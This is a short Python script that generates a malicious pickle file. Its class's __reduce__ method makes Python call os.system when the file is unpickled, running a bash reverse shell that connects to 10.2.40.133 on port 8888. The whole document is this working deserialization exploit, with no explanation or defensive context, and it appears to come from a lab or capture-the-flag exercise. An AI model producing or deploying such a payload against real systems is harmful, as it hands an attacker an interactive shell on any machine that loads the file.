#!/usr/bin/env python3

import pickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("bash -c 'bash -i >& /dev/tcp/10.2.40.133/8888 0>&1'",))

pickle.dump(SerializedPickle(), open('malicious','wb'))
